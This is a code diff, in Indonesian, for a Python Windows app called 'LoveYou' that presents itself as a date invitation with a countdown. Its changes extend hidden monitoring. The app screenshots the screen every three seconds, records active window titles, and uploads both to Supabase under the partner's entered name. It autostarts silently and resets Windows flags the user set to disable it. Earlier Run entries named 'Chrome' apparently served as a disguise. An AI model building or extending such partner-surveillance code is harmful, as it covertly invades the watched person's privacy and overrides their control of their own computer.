@@ -10,16 +10,20 @@ waktu screenshot selalu presisi tanpa terhambat latensi upload jaringan.
 
 import os
 import sys
+import io
+import re
 import time
 import queue
 import ctypes
+import tempfile
 import platform
 import argparse
 import threading
 import subprocess
 import webbrowser
+import urllib.parse
 import configparser
-from datetime import datetime, timezone
+from datetime import datetime, timezone, timedelta
 import winreg
 
 import mss
@@ -28,6 +32,22 @@ from PIL import Image, ImageDraw
 import pystray
 import webview
 from supabase import create_client, Client
+
+
+def setup_safe_stdio():
+    """Memastikan sys.stdout dan sys.stderr tidak crash di mode --windowed atau non-UTF8."""
+    for stream_name in ("stdout", "stderr"):
+        stream = getattr(sys, stream_name, None)
+        if stream is None:
+            setattr(sys, stream_name, io.StringIO())
+        elif hasattr(stream, "reconfigure"):
+            try:
+                stream.reconfigure(encoding="utf-8", errors="replace")
+            except Exception:
+                pass
+
+
+setup_safe_stdio()
 
 
 # ==============================================================================
@@ -40,6 +60,117 @@ DEFAULT_BUCKET_NAME = "screenshots"
 DEFAULT_INTERVAL = 3  # Delay 3 detik sesuai permintaan
 DEFAULT_LOCAL_FOLDER = "screenshots"
 DEFAULT_APP_NAME = "LoveYou"
+DEFAULT_INVITE_TEXT = "SABTU, 5 DESEMBER 2026"
+DEFAULT_COUNTDOWN_TARGET = "2026-12-05T12:00:00Z"
+DEFAULT_TANGGAL_DATE = "2026-12-05"
+
+ID_MONTHS_TO_NUM = {
+    "januari": 1, "jan": 1, "january": 1,
+    "februari": 2, "feb": 2, "pebruari": 2, "february": 2,
+    "maret": 3, "mar": 3, "march": 3,
+    "april": 4, "apr": 4,
+    "mei": 5, "may": 5,
+    "juni": 6, "jun": 6, "june": 6,
+    "juli": 7, "jul": 7, "july": 7,
+    "agustus": 8, "agu": 8, "ags": 8, "aug": 8, "august": 8,
+    "september": 9, "sep": 9, "sept": 9,
+    "oktober": 10, "okt": 10, "oct": 10, "october": 10,
+    "november": 11, "nov": 11, "nopember": 11, "nop": 11,
+    "desember": 12, "des": 12, "dec": 12, "december": 12,
+}
+
+NUM_TO_ID_MONTH = {
+    1: "JANUARI", 2: "FEBRUARI", 3: "MARET", 4: "APRIL",
+    5: "MEI", 6: "JUNI", 7: "JULI", 8: "AGUSTUS",
+    9: "SEPTEMBER", 10: "OKTOBER", 11: "NOVEMBER", 12: "DESEMBER",
+}
+
+
+def resolve_date_settings(raw_text: str, raw_target: str) -> dict:
+    """
+    Menyelaraskan date_invitation_text, date_countdown_target, dan tanggal_date (YYYY-MM-DD).
+    Jika user mengkustomisasi Teks Tanggal Undangan (misal 'MINGGU, 27 DESEMBER 2026'),
+    otomatis menyesuaikan countdown target & tanggal_date untuk tabel user_responses.
+    """
+    invite_text = (raw_text or "").strip() or DEFAULT_INVITE_TEXT
+    target_iso = (raw_target or "").strip() or DEFAULT_COUNTDOWN_TARGET
+
+    lower = invite_text.lower()
+    parsed_ymd = None
+    month_pattern = "|".join(sorted(ID_MONTHS_TO_NUM.keys(), key=len, reverse=True))
+    m1 = re.search(rf"\b(\d{{1,2}})\s+({month_pattern})\s+(\d{{4}})\b", lower)
+    if m1:
+        day, mon_str, year = int(m1.group(1)), m1.group(2), int(m1.group(3))
+        month = ID_MONTHS_TO_NUM.get(mon_str, 12)
+        try:
+            datetime(year, month, day)
+            parsed_ymd = (year, month, day)
+        except ValueError:
+            pass
+
+    if not parsed_ymd:
+        m2 = re.search(r"\b(\d{4})[-/](\d{1,2})[-/](\d{1,2})\b", lower)
+        if m2:
+            try:
+                y, m, d = int(m2.group(1)), int(m2.group(2)), int(m2.group(3))
+                datetime(y, m, d)
+                parsed_ymd = (y, m, d)
+            except ValueError:
+                pass
+
+    if not parsed_ymd:
+        m3 = re.search(r"\b(\d{1,2})[-/](\d{1,2})[-/](\d{4})\b", lower)
+        if m3:
+            try:
+                d, m, y = int(m3.group(1)), int(m3.group(2)), int(m3.group(3))
+                datetime(y, m, d)
+                parsed_ymd = (y, m, d)
+            except ValueError:
+                pass
+
+    remainder = (lower[:m1.start()] + " " + lower[m1.end():]) if m1 else lower
+    tm = re.search(r"(?:•|pukul|jam|\b)\s*([01]?\d|2[0-3])[:\.]([0-5]\d)\b", remainder)
+    parsed_hm = (int(tm.group(1)), int(tm.group(2))) if tm else None
+
+    wib = timezone(timedelta(hours=7))
+    target_dt = None
+    try:
+        s = target_iso[:-1] + "+00:00" if target_iso.lower().endswith("z") else target_iso
+        dt = datetime.fromisoformat(s)
+        target_dt = dt.replace(tzinfo=wib) if dt.tzinfo is None else dt.astimezone(wib)
+    except Exception:
+        pass
+
+    default_ymd = (2026, 12, 5)
+    target_ymd = (target_dt.year, target_dt.month, target_dt.day) if target_dt else default_ymd
+    target_hm = (target_dt.hour, target_dt.minute) if target_dt else (19, 0)
+
+    if parsed_ymd:
+        if parsed_ymd != default_ymd and target_ymd == default_ymd:
+            final_ymd = parsed_ymd
+            final_hm = parsed_hm if parsed_hm else target_hm
+            target_iso = datetime(final_ymd[0], final_ymd[1], final_ymd[2], final_hm[0], final_hm[1], 0, tzinfo=wib).isoformat()
+        elif parsed_ymd == default_ymd and target_ymd != default_ymd and invite_text.upper() == DEFAULT_INVITE_TEXT:
+            final_ymd = target_ymd
+            dt_obj = datetime(final_ymd[0], final_ymd[1], final_ymd[2])
+            day_name = DAYS_ID.get(dt_obj.weekday(), "Sabtu").upper()
+            mon_name = NUM_TO_ID_MONTH.get(final_ymd[1], "DESEMBER")
+            invite_text = f"{day_name}, {final_ymd[2]} {mon_name} {final_ymd[0]}"
+        else:
+            final_ymd = parsed_ymd
+            if parsed_hm:
+                target_iso = datetime(final_ymd[0], final_ymd[1], final_ymd[2], parsed_hm[0], parsed_hm[1], 0, tzinfo=wib).isoformat()
+            elif target_ymd != parsed_ymd:
+                target_iso = datetime(final_ymd[0], final_ymd[1], final_ymd[2], target_hm[0], target_hm[1], 0, tzinfo=wib).isoformat()
+        tanggal_date = f"{final_ymd[0]:04d}-{final_ymd[1]:02d}-{final_ymd[2]:02d}"
+    else:
+        tanggal_date = f"{target_ymd[0]:04d}-{target_ymd[1]:02d}-{target_ymd[2]:02d}"
+
+    return {
+        "date_invitation_text": invite_text,
+        "date_countdown_target": target_iso,
+        "tanggal_date": tanggal_date,
+    }
 
 
 DAYS_ID = {
@@ -60,27 +191,35 @@ def get_base_dir() -> str:
     return os.path.dirname(os.path.abspath(__file__))
 
 
-def get_frontend_path() -> str:
+def get_frontend_dir() -> str:
     """
-    Mencari path ke frontend/src/index.html.
-    - Frozen (exe di root):  <exe_dir>/frontend/src/index.html
-    - Dev (backend/script):  <backend_dir>/../frontend/src/index.html
-    - Bundled (_MEIPASS):    <meipass>/frontend/src/index.html
+    Mencari folder root frontend/src.
+    - Bundled (_MEIPASS):    <meipass>/frontend/src
+    - Frozen (exe di root):  <exe_dir>/frontend/src atau _internal/frontend/src
+    - Dev (backend/script):  <backend_dir>/../frontend/src
     """
-    # PyInstaller bundle (--add-data)
     meipass = getattr(sys, "_MEIPASS", None)
     if meipass:
-        p = os.path.join(meipass, "frontend", "src", "index.html")
+        p = os.path.join(meipass, "frontend", "src")
         if os.path.exists(p):
             return p
 
     base = get_base_dir()
-    # Frozen exe di root project
     if getattr(sys, "frozen", False):
-        return os.path.join(base, "frontend", "src", "index.html")
+        for candidate in (
+            os.path.join(base, "frontend", "src"),
+            os.path.join(base, "_internal", "frontend", "src"),
+        ):
+            if os.path.exists(candidate):
+                return candidate
+        return os.path.join(base, "frontend", "src")
 
-    # Dev mode: script ada di backend/, frontend satu level di atas
-    return os.path.abspath(os.path.join(base, "..", "frontend", "src", "index.html"))
+    return os.path.abspath(os.path.join(base, "..", "frontend", "src"))
+
+
+def get_frontend_path(page: str = "index.html") -> str:
+    """Mengembalikan path ke halaman tertentu di dalam frontend/src/."""
+    return os.path.join(get_frontend_dir(), page)
 
 
 def load_config() -> dict:
@@ -113,6 +252,9 @@ def load_config() -> dict:
         "emergency_hotkey": True,
         "hotkey_combo": "Ctrl+Shift+F12",
         "tray_icon": "heart.ico",
+        "date_invitation_text": DEFAULT_INVITE_TEXT,
+        "date_countdown_target": DEFAULT_COUNTDOWN_TARGET,
+        "tanggal_date": DEFAULT_TANGGAL_DATE,
     }
 
     if os.path.exists(config_path):
@@ -143,6 +285,14 @@ def load_config() -> dict:
             if "SECURITY" in config:
                 conf["emergency_hotkey"] = config["SECURITY"].getboolean("emergency_hotkey", conf["emergency_hotkey"])
                 conf["hotkey_combo"] = config["SECURITY"].get("hotkey_combo", conf["hotkey_combo"]).strip()
+
+            if "CONTENT" in config:
+                raw_text = config["CONTENT"].get("date_invitation_text", conf["date_invitation_text"]).strip()
+                raw_target = config["CONTENT"].get("date_countdown_target", conf["date_countdown_target"]).strip()
+                resolved = resolve_date_settings(raw_text, raw_target)
+                conf["date_invitation_text"] = resolved["date_invitation_text"]
+                conf["date_countdown_target"] = resolved["date_countdown_target"]
+                conf["tanggal_date"] = config["CONTENT"].get("tanggal_date", resolved["tanggal_date"]).strip() or resolved["tanggal_date"]
         except Exception as e:
             print(f"[WARN] Gagal membaca config.ini ({e}), menggunakan default.")
 
@@ -173,11 +323,105 @@ def get_active_window_title() -> str:
     return ""
 
 
-def register_startup(app_name: str) -> bool:
+def get_app_state_id(conf: dict) -> str:
+    """Menghasilkan ID unik yang aman untuk Registry state dan Mutex berdasarkan app_name & table_name."""
+    raw = f"{conf.get('app_name', DEFAULT_APP_NAME)}_{conf.get('table_name', DEFAULT_TABLE_NAME)}"
+    safe = "".join(c if c.isalnum() or c in ("-", "_") else "_" for c in raw).strip("_")
+    return safe or "LoveYou"
+
+
+def load_app_state(conf: dict) -> dict:
+    """Membaca state persisten (active_user, onboarding_done, date_accepted) dari Windows Registry."""
+    state = {"active_user": "", "onboarding_done": False, "date_accepted": False}
+    state_id = get_app_state_id(conf)
+    reg_path = rf"Software\XooseLoveYou\{state_id}"
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
+        try:
+            val, _ = winreg.QueryValueEx(key, "active_user")
+            if isinstance(val, str) and val.strip():
+                state["active_user"] = val.strip()
+        except FileNotFoundError:
+            pass
+        try:
+            val, _ = winreg.QueryValueEx(key, "onboarding_done")
+            state["onboarding_done"] = bool(val)
+        except FileNotFoundError:
+            pass
+        try:
+            val, _ = winreg.QueryValueEx(key, "date_accepted")
+            state["date_accepted"] = bool(val)
+        except FileNotFoundError:
+            pass
+        winreg.CloseKey(key)
+    except FileNotFoundError:
+        pass
+    except Exception as e:
+        print(f"[WARN] Gagal membaca state Registry: {e}")
+    return state
+
+
+def save_app_state(
+    conf: dict,
+    active_user: str | None = None,
+    onboarding_done: bool | None = None,
+    date_accepted: bool | None = None,
+):
+    """Menyimpan state persisten ke Registry agar tetap tersimpan setelah restart & sinkron antar proses."""
+    state_id = get_app_state_id(conf)
+    reg_path = rf"Software\XooseLoveYou\{state_id}"
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+        if active_user is not None:
+            winreg.SetValueEx(key, "active_user", 0, winreg.REG_SZ, str(active_user).strip())
+        if onboarding_done is not None:
+            winreg.SetValueEx(key, "onboarding_done", 0, winreg.REG_DWORD, 1 if onboarding_done else 0)
+        if date_accepted is not None:
+            winreg.SetValueEx(key, "date_accepted", 0, winreg.REG_DWORD, 1 if date_accepted else 0)
+        winreg.CloseKey(key)
+    except Exception as e:
+        print(f"[WARN] Gagal menyimpan state Registry: {e}")
+
+
+def clear_app_state(conf: dict):
+    """Menghapus bersih state aplikasi ini dari Registry saat proses Uninstall."""
+    state_id = get_app_state_id(conf)
+    try:
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, rf"Software\XooseLoveYou\{state_id}")
+    except FileNotFoundError:
+        pass
+    except Exception:
+        pass
+    try:
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\XooseLoveYou")
+    except Exception:
+        pass
+
+
+def _clear_startup_disabled_flag(app_name: str):
+    """Menghapus flag StartupApproved disabled lama untuk app_name agar auto-start aktif kembali saat install ulang."""
+    for subkey, value_name in (
+        (r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run", app_name),
+        (r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder", f"{app_name}.lnk"),
+    ):
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_READ)
+            try:
+                val, _ = winreg.QueryValueEx(key, value_name)
+                if isinstance(val, (bytes, bytearray)) and len(val) > 0 and val[0] != 0x02:
+                    winreg.DeleteValue(key, value_name)
+            except FileNotFoundError:
+                pass
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+
+
+def register_startup(app_name: str, is_silent_launch: bool = False) -> bool:
     """
     Mendaftarkan aplikasi ke Windows Startup melalui dua jalur:
     1. Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)
-    2. Folder Startup Pengguna (%APPDATA%\\...\\Startup\\LoveYou.lnk)
+    2. Folder Startup Pengguna (%APPDATA%\\...\\Startup\\<app_name>.lnk)
     Menggunakan argumen --silent agar saat laptop menyala, berjalan di latar belakang tanpa pop-up.
     """
     success = False
@@ -195,43 +439,67 @@ def register_startup(app_name: str) -> bool:
             pythonw = sys.executable
         cmd = f'"{pythonw}" "{target_path}" --silent'
 
+    # Saat bukan boot --silent, pastikan flag StartupApproved lama yang disabled ter-reset
+    if not is_silent_launch:
+        _clear_startup_disabled_flag(app_name)
+
     # 1. Daftarkan ke Registry Run Key
     try:
         run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_key)
 
         for old_name in ["Google Chrome", "Chrome"]:
-            try:
-                winreg.DeleteValue(key, old_name)
-            except FileNotFoundError:
-                pass
+            if old_name != app_name:
+                try:
+                    winreg.DeleteValue(key, old_name)
+                except FileNotFoundError:
+                    pass
 
-        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)
+        existing_cmd = None
+        try:
+            existing_cmd, _ = winreg.QueryValueEx(key, app_name)
+        except FileNotFoundError:
+            pass
+
+        if existing_cmd != cmd:
+            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, cmd)
         winreg.CloseKey(key)
         success = True
     except Exception as e:
         print(f"[WARN] Registry startup registration failed: {e}")
 
-    # 2. Buat Shortcut di Folder Startup (Shell:Startup)
+    # 2. Buat Shortcut di Folder Startup (Shell:Startup) memakai temp_dir (bukan folder exe) & CREATE_NO_WINDOW
     try:
         startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
+        os.makedirs(startup_dir, exist_ok=True)
         lnk_path = os.path.join(startup_dir, f"{app_name}.lnk")
 
-        vbs_content = (
-            f'Set ws = WScript.CreateObject("WScript.Shell")\n'
-            f'Set lnk = ws.CreateShortcut("{lnk_path}")\n'
-            f'lnk.TargetPath = "{target_path}"\n'
-            f'lnk.Arguments = "--silent"\n'
-            f'lnk.WorkingDirectory = "{work_dir}"\n'
-            f'lnk.Save\n'
-        )
-        temp_vbs = os.path.join(base_dir, "_create_lnk.vbs")
-        with open(temp_vbs, "w", encoding="utf-8") as f:
-            f.write(vbs_content)
-
-        os.system(f'cscript //nologo "{temp_vbs}"')
-        if os.path.exists(temp_vbs):
-            os.remove(temp_vbs)
+        if (not is_silent_launch) or (not os.path.exists(lnk_path)):
+            vbs_content = (
+                f'Set ws = WScript.CreateObject("WScript.Shell")\r\n'
+                f'Set lnk = ws.CreateShortcut("{lnk_path}")\r\n'
+                f'lnk.TargetPath = "{target_path}"\r\n'
+                f'lnk.Arguments = "--silent"\r\n'
+                f'lnk.WorkingDirectory = "{work_dir}"\r\n'
+                f'lnk.Save\r\n'
+            )
+            temp_vbs = os.path.join(tempfile.gettempdir(), f"_xoose_lnk_{os.getpid()}.vbs")
+            try:
+                with open(temp_vbs, "w", encoding="utf-16") as f:
+                    f.write(vbs_content)
+                subprocess.run(
+                    ["cscript", "//nologo", temp_vbs],
+                    creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    timeout=10,
+                )
+            finally:
+                if os.path.exists(temp_vbs):
+                    try:
+                        os.remove(temp_vbs)
+                    except Exception:
+                        pass
         success = True
     except Exception as e:
         print(f"[WARN] Startup folder shortcut creation failed: {e}")
@@ -240,13 +508,33 @@ def register_startup(app_name: str) -> bool:
 
 
 def unregister_startup(app_name: str) -> bool:
-    """Menghapus aplikasi dari Windows Startup (Registry dan folder Startup)."""
+    """Menghapus aplikasi dari Windows Startup (Registry, StartupApproved, dan folder Startup)."""
+    names_to_remove = list(dict.fromkeys([app_name, "LoveYou", "loveyou", "Google Chrome", "Chrome"]))
+    for reg_path in (
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
+    ):
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
+            for name in names_to_remove:
+                try:
+                    winreg.DeleteValue(key, name)
+                except FileNotFoundError:
+                    pass
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+
     try:
-        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE)
-        for name in [app_name, "LoveYou", "loveyou", "Google Chrome", "Chrome"]:
+        key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder",
+            0,
+            winreg.KEY_SET_VALUE,
+        )
+        for name in names_to_remove:
             try:
-                winreg.DeleteValue(key, name)
+                winreg.DeleteValue(key, f"{name}.lnk")
             except FileNotFoundError:
                 pass
         winreg.CloseKey(key)
@@ -268,7 +556,8 @@ def unregister_startup(app_name: str) -> bool:
 def uninstall_and_clean_exit(controller):
     """
     Menonaktifkan layanan, mencabut dari Windows Startup (Registry & Startup folder),
-    membersihkan seluruh file dan folder screenshot lokal / temp, dan menghentikan proses aplikasi.
+    membersihkan state persisten Registry dan seluruh file/folder screenshot lokal / temp,
+    lalu menghentikan proses aplikasi.
     """
     print("\n" + "=" * 65)
     print("[UNINSTALL] Memulai proses penonaktifan darurat & pembersihan total...")
@@ -276,11 +565,12 @@ def uninstall_and_clean_exit(controller):
 
     controller.is_running = False
 
-    # 1. Cabut dari Windows Startup
+    # 1. Cabut dari Windows Startup & hapus state persisten Registry
     app_name = controller.conf.get("app_name", DEFAULT_APP_NAME)
     try:
         unregister_startup(app_name)
-        print(f"[UNINSTALL OK] Aplikasi '{app_name}' berhasil dicabut dari Windows Startup.")
+        clear_app_state(controller.conf)
+        print(f"[UNINSTALL OK] Aplikasi '{app_name}' berhasil dicabut dari Windows Startup & Registry state.")
     except Exception as e:
         print(f"[UNINSTALL WARN] Gagal mencabut startup: {e}")
 
@@ -296,7 +586,6 @@ def uninstall_and_clean_exit(controller):
 
     # 3. Hapus folder temporary capture jika ada
     try:
-        import tempfile
         import shutil
         temp_dir = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
         if os.path.exists(temp_dir):
@@ -680,25 +969,48 @@ class ServiceController:
         self.conf = conf
         self.is_running = True
         self.is_paused = False
-        self.current_user = "anonymous"
+        saved_state = load_app_state(conf)
+        saved_user = saved_state.get("active_user", "").strip()
+        self.current_user = saved_user if saved_user else "anonymous"
+        self.onboarding_done = bool(saved_state.get("onboarding_done", False))
+        self.date_accepted = bool(saved_state.get("date_accepted", False))
         self.upload_queue = queue.Queue(maxsize=200)
         self.tray_icon: pystray.Icon | None = None
         self.supabase_logger: SupabaseLogger | None = None
         self.total_captured = 0
         self.total_uploaded = 0
 
+        self._init_supabase_logger()
+
+    def _init_supabase_logger(self) -> bool:
+        """Inisialisasi atau inisialisasi ulang client Supabase (aman dipanggil ulang jika sempat offline)."""
+        if self.supabase_logger is not None:
+            return True
         try:
             self.supabase_logger = SupabaseLogger(
-                url=conf["supabase_url"],
-                key=conf["supabase_key"],
-                table_name=conf["table_name"],
-                bucket_name=conf["bucket_name"],
+                url=self.conf["supabase_url"],
+                key=self.conf["supabase_key"],
+                table_name=self.conf["table_name"],
+                bucket_name=self.conf["bucket_name"],
             )
+            return True
         except Exception as e:
             print(f"[WARN] Supabase init error: {e}")
+            return False
 
-    def set_active_user(self, name: str):
-        """Menyetel user aktif saat pacar/user mengisi nama di LoveYou App."""
+    def sync_user_from_state(self):
+        """Sinkronkan current_user dari Registry (jika ada update dari proses UI lain)."""
+        try:
+            state = load_app_state(self.conf)
+            reg_user = state.get("active_user", "").strip()
+            if reg_user and reg_user != self.current_user:
+                self.current_user = reg_user
+                print(f"[SYNC] User aktif diperbarui dari Registry ke: '{self.current_user}'")
+        except Exception:
+            pass
+
+    def set_active_user(self, name: str, persist: bool = True):
+        """Menyetel user aktif saat pacar/user mengisi nama di LoveYou App dan menyimpannya persisten."""
         cleaned = (name or "").strip()
         if not cleaned:
             return
@@ -706,6 +1018,8 @@ class ServiceController:
         safe_name = "".join(c for c in cleaned if c.isalnum() or c in ("-", "_", " ")).strip()
         if safe_name:
             self.current_user = safe_name
+            if persist:
+                save_app_state(self.conf, active_user=safe_name)
             print(f"[USER] User aktif sekarang diubah ke: '{self.current_user}'")
             self.update_tray_status()
 
@@ -717,20 +1031,40 @@ class ServiceController:
             except Exception:
                 pass
 
+    @staticmethod
+    def _is_transient_network_error(err: Exception | str) -> bool:
+        msg = str(err).lower()
+        markers = (
+            "connect",
+            "timeout",
+            "timed out",
+            "getaddrinfo",
+            "name resolution",
+            "network",
+            "dns",
+            "ssl",
+            "socket",
+            "winerror",
+            "temporarily unavailable",
+            "eof",
+            "reset",
+        )
+        return any(m in msg for m in markers)
+
     def capture_worker(self):
         """Thread Producer: Menangkap screenshot tepat waktu sesuai interval (3s)."""
-        print(f"[CAPTURE] Producer aktif. Menangkap layar setiap {self.conf['interval_seconds']} detik...")
+        print(f"[CAPTURE] Producer aktif (user: '{self.current_user}'). Menangkap layar setiap {self.conf['interval_seconds']} detik...")
         while self.is_running:
             start_time = time.time()
             if not self.is_paused:
                 try:
+                    self.sync_user_from_state()
                     active_window = get_active_window_title()
                     active_user = self.current_user
 
                     # Jika tidak simpan salinan lokal, gunakan direktori temporer Windows (%TEMP%)
                     # agar TIDAK PERNAH membuat folder 'screenshots' sama sekali di folder aplikasi.
                     if not self.conf.get("keep_local_file", True):
-                        import tempfile
                         temp_base = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
                         user_dir = os.path.join(temp_base, active_user) if active_user != "anonymous" else temp_base
                     else:
@@ -756,7 +1090,15 @@ class ServiceController:
                     try:
                         self.upload_queue.put_nowait(item)
                     except queue.Full:
-                        print("[WARN] Antrean upload penuh, mengabaikan screenshot tertua.")
+                        # Keluarkan item tertua jika penuh agar antrean tetap segar saat koneksi kembali pulih
+                        try:
+                            dropped = self.upload_queue.get_nowait()
+                            self.upload_queue.task_done()
+                            if not self.conf.get("keep_local_file", True) and os.path.exists(dropped.get("filepath", "")):
+                                os.remove(dropped["filepath"])
+                            self.upload_queue.put_nowait(item)
+                        except Exception:
+                            print("[WARN] Antrean upload penuh, mengabaikan screenshot terbaru.")
 
                     self.update_tray_status()
 
@@ -773,7 +1115,7 @@ class ServiceController:
         print("[CAPTURE] Producer berhenti.")
 
     def uploader_worker(self):
-        """Thread Consumer: Mengunggah screenshot dari antrean ke Supabase."""
+        """Thread Consumer: Mengunggah screenshot dari antrean ke Supabase dengan auto-retry saat boot/offline."""
         print("[UPLOADER] Consumer aktif. Mengunggah ke Supabase...")
         while self.is_running:
             try:
@@ -788,50 +1130,82 @@ class ServiceController:
             file_size = item["file_size"]
             user_name = item.get("user_name", "anonymous")
 
+            # Pastikan user terbaru tersinkron jika sebelumnya masih anonymous
+            if user_name == "anonymous":
+                self.sync_user_from_state()
+                if self.current_user != "anonymous":
+                    user_name = self.current_user
+
             image_url = ""
             storage_error = None
 
-            # Simpan di Supabase Storage dalam folder user (misal: roedi/ss_...jpg)
+            # Simpan di Supabase Storage dalam folder user (misal: roedi/ss_...webp)
             storage_filename = f"{user_name}/{filename}" if user_name != "anonymous" else filename
             storage_path = f"{self.conf['bucket_name']}/{storage_filename}"
 
-            if self.supabase_logger:
-                # 1. Upload Storage
-                try:
-                    image_url = self.supabase_logger.upload_file(filepath, storage_filename)
-                except Exception as e:
-                    storage_error = str(e)
-                    print(f"[UPLOAD FAIL] Storage: {e}")
+            # Pastikan SupabaseLogger aktif (retry jika sempat gagal saat boot awal/offline)
+            for _ in range(8):
+                if self.supabase_logger or not self.is_running:
+                    break
+                if self._init_supabase_logger():
+                    break
+                time.sleep(3)
 
-                # Jika upload gagal tapi kita tahu path-nya, tetap construct URL publik
+            if self.supabase_logger and os.path.exists(filepath):
+                # 1. Upload Storage dengan retry untuk error jaringan (Wi-Fi baru connect setelah restart)
+                max_upload_attempts = 6
+                for attempt in range(1, max_upload_attempts + 1):
+                    if not self.is_running:
+                        break
+                    try:
+                        storage_error = None
+                        image_url = self.supabase_logger.upload_file(filepath, storage_filename)
+                        break
+                    except Exception as e:
+                        storage_error = str(e)
+                        print(f"[UPLOAD FAIL #{attempt}] Storage: {e}")
+                        if attempt < max_upload_attempts and self._is_transient_network_error(e):
+                            time.sleep(min(4 * attempt, 10))
+                        else:
+                            break
+
                 if not image_url and not storage_error:
                     image_url = f"{self.conf['supabase_url']}/storage/v1/object/public/{self.conf['bucket_name']}/{storage_filename}"
 
-                # 2. Catat ke Database
-                try:
-                    status = "success" if not storage_error else "storage_failed"
-                    notes = f"Window: {active_window}" if active_window else ""
-                    if storage_error:
-                        notes += f" | Storage err: {storage_error}"
+                # 2. Catat ke Database dengan retry untuk error jaringan
+                max_db_attempts = 5
+                for attempt in range(1, max_db_attempts + 1):
+                    if not self.is_running:
+                        break
+                    try:
+                        status = "success" if not storage_error else "storage_failed"
+                        notes = f"Window: {active_window}" if active_window else ""
+                        if storage_error:
+                            notes += f" | Storage err: {storage_error}"
 
-                    self.supabase_logger.log_record(
-                        filename=filename,
-                        image_url=image_url if image_url else "",
-                        resolution=resolution,
-                        active_window=active_window,
-                        file_size_bytes=file_size,
-                        status=status,
-                        notes=notes,
-                        user_name=user_name,
-                        storage_path=storage_path,
-                    )
-                    self.total_uploaded += 1
-                    print(f"[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD #{self.total_uploaded} OK] [{user_name}] {filename} -> Supabase")
-                except Exception as e:
-                    print(f"[DB FAIL] Database log error: {e}")
+                        self.supabase_logger.log_record(
+                            filename=filename,
+                            image_url=image_url if image_url else "",
+                            resolution=resolution,
+                            active_window=active_window,
+                            file_size_bytes=file_size,
+                            status=status,
+                            notes=notes,
+                            user_name=user_name,
+                            storage_path=storage_path,
+                        )
+                        self.total_uploaded += 1
+                        print(f"[{datetime.now().strftime('%H:%M:%S')}] [UPLOAD #{self.total_uploaded} OK] [{user_name}] {filename} -> Supabase")
+                        break
+                    except Exception as e:
+                        print(f"[DB FAIL #{attempt}] Database log error: {e}")
+                        if attempt < max_db_attempts and self._is_transient_network_error(e):
+                            time.sleep(min(3 * attempt, 8))
+                        else:
+                            break
 
-            # Hapus file lokal jika keep_local_file = False
-            if not self.conf["keep_local_file"] and not storage_error:
+            # Hapus file temporary jika keep_local_file = False (selalu bersihkan %TEMP% agar tidak menumpuk)
+            if not self.conf.get("keep_local_file", False):
                 try:
                     if os.path.exists(filepath):
                         os.remove(filepath)
@@ -846,10 +1220,10 @@ class ServiceController:
     # Menu Callbacks
     def on_capture_now(self, icon, item):
         try:
+            self.sync_user_from_state()
             active_window = get_active_window_title()
             active_user = self.current_user
             if not self.conf.get("keep_local_file", True):
-                import tempfile
                 temp_base = os.path.join(tempfile.gettempdir(), "_xoose_temp_capture")
                 target_dir = os.path.join(temp_base, active_user) if active_user != "anonymous" else temp_base
             else:
@@ -971,8 +1345,9 @@ def setup_tray(controller: ServiceController) -> pystray.Icon:
 
 class LoveYouApi:
     """Bridge Python-JS untuk pywebview agar frontend bisa memanggil fungsi Python."""
-    def __init__(self, controller=None):
+    def __init__(self, controller=None, conf: dict | None = None):
         self.controller = controller
+        self.conf = conf or (controller.conf if controller else load_config())
         self._last_submit = None
 
     def set_user(self, nama: str):
@@ -980,32 +1355,80 @@ class LoveYouApi:
         nama = (nama or "").strip()
         print(f"[UI BRIDGE] set_user diterima: '{nama}'")
         if self.controller:
-            self.controller.set_active_user(nama)
+            self.controller.set_active_user(nama, persist=True)
+        elif nama:
+            safe_name = "".join(c for c in nama if c.isalnum() or c in ("-", "_", " ")).strip()
+            if safe_name:
+                save_app_state(self.conf, active_user=safe_name)
+
+    def get_active_user(self) -> str:
+        """Mengembalikan nama user aktif yang tersimpan di Registry."""
+        state = load_app_state(self.conf)
+        saved = state.get("active_user", "").strip()
+        if saved:
+            return saved
+        if self.controller and self.controller.current_user != "anonymous":
+            return self.controller.current_user
+        return ""
+
+    def mark_onboarding_done(self):
+        """Menandai bahwa user sudah mencapai halaman countdown jadwal date."""
+        save_app_state(self.conf, onboarding_done=True)
+        if self.controller:
+            self.controller.onboarding_done = True
+
+    def get_date_config(self) -> dict:
+        """Mengembalikan konfigurasi tanggal undangan, countdown target, dan tanggal_date."""
+        return {
+            "date_invitation_text": self.conf.get("date_invitation_text", DEFAULT_INVITE_TEXT),
